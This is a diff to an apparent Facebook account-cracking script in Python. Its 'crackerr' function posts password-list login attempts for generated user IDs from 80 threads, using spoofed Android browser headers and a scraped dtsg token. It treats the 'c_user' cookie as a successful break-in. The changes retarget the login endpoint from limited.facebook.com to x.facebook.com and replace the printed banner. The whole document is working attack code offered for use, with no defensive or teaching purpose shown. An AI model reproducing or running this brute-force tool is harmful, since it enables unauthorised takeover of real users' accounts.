@@ -428,7 +428,7 @@ def mainn():
         gen.append(awm)
     with ThreadPoolExecutor(max_workers=80) as Submits:
         os.system('clear')
-        print("\x1b[1;97m━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━❤️❥❥━╬٨ـﮩﮩ❤٨ـﮩﮩـ╬━❤️❥❥") 
+        print(logo) 
         for next in gen:
             ids = code + next
             mk = ids[:6]
@@ -493,7 +493,7 @@ def crackerr(ids,passlist):
                          "__user": "0"
                     }
             headers = {
-                        "host": "limited.facebook.com",
+                        "host": "x.facebook.com",
                         "content-length": (";").join([ "%s=%s" % (key, value) for key, value in log_data.items() ]),
                         "sec-ch-ua-full-version-list": "\"Not;A=Brand\";v=\"99.0.0.0\", \"Nokia Webview\";v=\""+f"{str(random.randint(127,139))}.0.{str(random.randint(5111,8999))}.{str(random.randint(111,299))}"+"\", \"Chromium\";v=\""+f"{str(random.randint(127,139))}.0.{str(random.randint(5111,8999))}.{str(random.randint(111,299))}"+"\"",
                         "sec-ch-ua-platform": "\"Android\"",
@@ -506,7 +506,7 @@ def crackerr(ids,passlist):
                         "x-response-format": "JSONStream",
                         "sec-ch-ua-platform-version": "\"\"",
                         "accept": "*/*",
-                        "origin": "https://limited.facebook.com",
+                        "origin": "https://x.facebook.com",
                         "sec-fetch-site": "same-origin",
                         "sec-fetch-mode": "cors",
                         "sec-fetch-dest": "empty",
@@ -520,7 +520,7 @@ def crackerr(ids,passlist):
                         "x-fb-dtsg-token": re.search('"dtsg":{"token":"(.*?)"',str(resp)).group(1),
                         "cookie": (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ]),
                     }
-            response = session.post("https://limited.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
+            response = session.post("https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
             #print(headers)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
